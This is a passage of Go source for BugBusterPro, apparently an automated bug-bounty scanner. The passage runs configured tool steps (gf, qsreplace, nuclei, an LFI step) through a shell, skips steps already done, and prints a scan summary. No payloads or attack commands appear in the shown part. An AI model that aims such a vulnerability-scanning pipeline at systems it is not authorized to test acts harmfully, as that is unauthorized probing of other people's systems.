			OutputFile:   lfiOutput,
			RequiresPipe: true, // Uses cat, gf, qsreplace, nuclei pipe/redirect
		},
	}
	return steps
}

// runAllSteps executes each defined step sequentially, handling skips and errors.
func runAllSteps(config *Config, steps []StepInfo) {
	totalSteps := len(steps)
	for i := range steps { // Iterate using index to modify step completion status
		step := &steps[i] // Get pointer to the current step for modification

		config.Logger.Printf(colorCyan+"\n[%d/%d] Starting: %s"+colorReset, i+1, totalSteps, step.Name)
		config.Logger.Printf(colorBlue+"--> Description: %s"+colorReset, step.Description)
		config.Logger.Printf(colorBlue+"--> Output File: %s"+colorReset, step.OutputFile)

		// --- Check Skip Conditions ---
		outputExists := fileExists(step.OutputFile)
		// Check if output exists AND has content for skipping (unless forcing)
		outputNotEmptyAndNotForced := !config.Force && isStepCompleted(step.OutputFile)

		if outputNotEmptyAndNotForced {
			config.Logger.Printf(colorYellow+"Skipping: Output file '%s' already exists and is not empty. Use --force to rerun."+colorReset, step.OutputFile)
			step.Completed = true // Mark as completed (from previous run)
			config.Logger.Println("---") // Separator
			continue             // Move to the next step
		}

		// Log if forcing or running because output is empty
		if config.Force && outputExists {
			config.Logger.Printf(colorYellow+"Note: --force enabled, rerunning step even though output '%s' exists."+colorReset, step.OutputFile)
		} else if !config.Force && outputExists && !isStepCompleted(step.OutputFile) {
			// File exists but is empty, and we are not forcing -> rerun
			config.Logger.Printf(colorYellow+"Note: Output file '%s' exists but is empty. Rerunning step."+colorReset, step.OutputFile)
		}

		// --- Prepare and Run Step ---
		// Ensure output directory exists before running the command
		outputDir := filepath.Dir(step.OutputFile)
		if err := os.MkdirAll(outputDir, 0755); err != nil {
			config.Logger.Printf(colorRed+"Error: Cannot create output directory '%s' for step %d: %v. Skipping step."+colorReset, outputDir, i+1, err)
			step.Completed = false // Mark as not completed due to setup error
			config.Logger.Println("---")
			continue // Skip to next step
		}

		// Execute the command
		startTime := time.Now()
		err := runStep(config, *step) // Pass the step value to runStep
		duration := time.Since(startTime)

		// --- Evaluate Result ---
		if err != nil {
			// Log error from runStep (which includes command exit error)
			config.Logger.Printf(colorRed+"Error running step [%d/%d] %s: %v (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, err, duration.Round(time.Second))
			step.Completed = false // Mark as failed

			// Check if output file exists but might be empty due to the error
			if fileExists(step.OutputFile) && !isStepCompleted(step.OutputFile) {
				config.Logger.Printf(colorYellow+"Note: Output file '%s' was created but is empty, likely due to the error."+colorReset, step.OutputFile)
			}
		} else {
			// Command execution succeeded (exit code 0)
			// Now verify if the expected output file was created and is not empty
			if !isStepCompleted(step.OutputFile) {
				// Command ran OK, but expected output is missing/empty
				config.Logger.Printf(colorYellow+"Warning: Step [%d/%d] %s completed without errors, but output file '%s' is missing or empty. The tool might have found nothing, or the command/output path is incorrect. (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, step.OutputFile, duration.Round(time.Second))
				step.Completed = true // Mark as run (execution succeeded)
			} else {
				// Command ran OK and output file looks good
				config.Logger.Printf(colorGreen+"Success: Step [%d/%d] %s completed successfully. (Duration: %s)"+colorReset, i+1, totalSteps, step.Name, duration.Round(time.Second))
				step.Completed = true
			}
		}
		config.Logger.Println("---") // Separator after each step attempt
	} // End steps loop
}

// fileExists checks if a file or directory exists at the given path.
func fileExists(filePath string) bool {
	_, err := os.Stat(filePath)
	// os.IsNotExist is the explicit check for non-existence. Other errors (like permission denied) mean we can't be sure.
	// For simplicity here, we return true if Stat returns no error.
	return err == nil
}

// isStepCompleted checks if the expected output file exists and has a size greater than 0.
func isStepCompleted(outputFile string) bool {
	info, err := os.Stat(outputFile)
	if err != nil {
		return false // File doesn't exist or other Stat error
	}
	// Check if it's actually a file and has content
	return !info.IsDir() && info.Size() > 0
}

// runStep executes a single command, handling shell piping/redirection if needed.
func runStep(config *Config, step StepInfo) error {
	config.Logger.Printf("Executing command: %s", step.Command)
	var cmd *exec.Cmd

	// Use 'sh -c' if the command requires shell interpretation (pipes, redirection)
	if step.RequiresPipe {
		cmd = exec.Command("sh", "-c", step.Command)
	} else {
		// For simple commands, split into command and args
		parts := strings.Fields(step.Command)
		if len(parts) == 0 {
			return fmt.Errorf("empty command provided for step '%s'", step.Name)
		}
		cmd = exec.Command(parts[0], parts[1:]...)
	}

	// Capture stderr for logging, especially errors
	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	// Start the command execution
	err := cmd.Start()
	if err != nil {
		// Log stderr if available even if start fails
		if stderr.Len() > 0 {
			config.Logger.Printf(colorRed+"[stderr on start] %s"+colorReset, stderr.String())
		}
		return fmt.Errorf("failed to start command for step '%s': %w", step.Name, err)
	}

	// Wait for the command to finish execution
	err = cmd.Wait()

	// Log stderr content if any was captured, useful for warnings or errors
	if stderr.Len() > 0 {
		// Log line by line for readability
		scanner := bufio.NewScanner(&stderr)
		for scanner.Scan() {
			config.Logger.Printf(colorYellow+"[stderr] %s"+colorReset, scanner.Text())
		}
	}

	// Return the error from cmd.Wait() if the command exited non-zero
	if err != nil {
		// The error often includes exit status information
		return fmt.Errorf("command for step '%s' exited with error: %w", step.Name, err)
	}

	return nil // Command finished successfully (exit code 0)
}

// printSummary displays a final summary of the scan results and status.
func printSummary(config *Config, steps []StepInfo) {
	config.Logger.Println(colorPurple + "\n===== BugBusterPro Scan Summary =====" + colorReset)
	config.Logger.Printf("Domain: %s", config.Domain)
	config.Logger.Printf("Output Directory: %s", config.OutputDir)
	config.Logger.Printf("Wordlist Used: %s", config.WordlistPath)
	config.Logger.Printf("Nuclei Templates Dir: %s", config.NucleiTemplatesDir)
	if config.InteractshServer != "" {
		config.Logger.Printf("Interactsh Server: %s", config.InteractshServer)
	}
	config.Logger.Printf("Scan End Time: %s", time.Now().Format("2006-01-02 15:04:05"))

	// --- Tally Step Results ---
	totalSteps := len(steps)
	completedCount := 0        // Steps that ran and produced non-empty output OR were skipped with existing output
	failedSteps := []string{}    // Steps that failed execution
	emptyOutputSteps := []string{} // Steps that ran successfully but produced empty/missing output

	config.Logger.Println(colorCyan + "\n--- Step Status ---" + colorReset)
	for i, step := range steps {
		status := ""
		stepRanSuccessfully := step.Completed // Did the runStep execution succeed?

		if stepRanSuccessfully {
			if isStepCompleted(step.OutputFile) {
				// Ran successfully AND produced non-empty output
				status = colorGreen + "[Completed]" + colorReset
				completedCount++
			} else {
				// Ran successfully BUT output is empty/missing
				status = colorYellow + "[Completed (No Output)]" + colorReset
				emptyOutputSteps = append(emptyOutputSteps, fmt.Sprintf("%d. %s (%s)", i+1, step.Name, step.OutputFile))
				// Treat as completed execution-wise, but flag it
				completedCount++
			}
		} else {
			// Execution failed OR was skipped
			// Check if it was skipped due to existing output (and not forcing)
			if !config.Force && isStepCompleted(step.OutputFile) {
				status = colorYellow + "[Skipped (Output Exists)]" + colorReset
				completedCount++ // Count as completed from a prior run
			} else {
				// Execution truly failed
				status = colorRed + "[Failed]" + colorReset
				failedSteps = append(failedSteps, fmt.Sprintf("%d. %s", i+1, step.Name))
			}
		}
		config.Logger.Printf("%s %s", status, step.Name)
	}

	// --- Final Status Message ---
	config.Logger.Printf("\nSteps Run/Succeeded: %d/%d", completedCount, totalSteps)

	if len(failedSteps) > 0 {
		config.Logger.Println(colorRed + "\n--- Failed Steps ---" + colorReset)
		for _, failed := range failedSteps {
			config.Logger.Printf("- %s", failed)
		}
		config.Logger.Println(colorRed + "Check the log file for detailed errors on failed steps." + colorReset)
	}

	if len(emptyOutputSteps) > 0 {
		config.Logger.Println(colorYellow + "\n--- Steps Completed with Missing/Empty Output ---" + colorReset)
		for _, empty := range emptyOutputSteps {
			config.Logger.Printf("- %s", empty)
		}
		config.Logger.Println(colorYellow + "These steps ran without error, but their expected output file was empty or missing. The tool might not have found results." + colorReset)
	}

	// Overall success message
	if len(failedSteps) == 0 && len(emptyOutputSteps) == 0 {
		config.Logger.Println(colorGreen + "\nAll steps completed successfully!" + colorReset)
	} else if len(failedSteps) == 0 && len(emptyOutputSteps) > 0 {
		config.Logger.Println(colorYellow + "\nAll steps ran without execution errors, but some produced no output. Review the summary and logs." + colorReset)
	} else {
		config.Logger.Println(colorYellow + "\nScan finished, but some steps failed during execution. Please review the logs." + colorReset)
	}

	// --- List Key Output Files ---
	config.Logger.Println(colorCyan + "\n--- Key Output Files (if generated and not empty) ---" + colorReset)
	significantFilesFound := false
	for _, step := range steps {
		// Only list files that exist and have content
		if isStepCompleted(step.OutputFile) {
			significantFilesFound = true
			fileInfo, err := os.Stat(step.OutputFile)
			if err == nil {
				config.Logger.Printf("- %s (%.2f KB)", step.OutputFile, float64(fileInfo.Size())/1024.0)
			} else {
				// Should not happen if isStepCompleted passed, but handle defensively
				config.Logger.Printf("- %s (Error getting file stats: %v)", step.OutputFile, err)
			}
		}
	}
	if !significantFilesFound {
		config.Logger.Println("No significant output files were found (or they were empty).")
	}

	config.Logger.Println(colorPurple + "\n===== End of Summary =====" + colorReset)
}

// contains is a helper function to check if a string exists in a string slice.
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
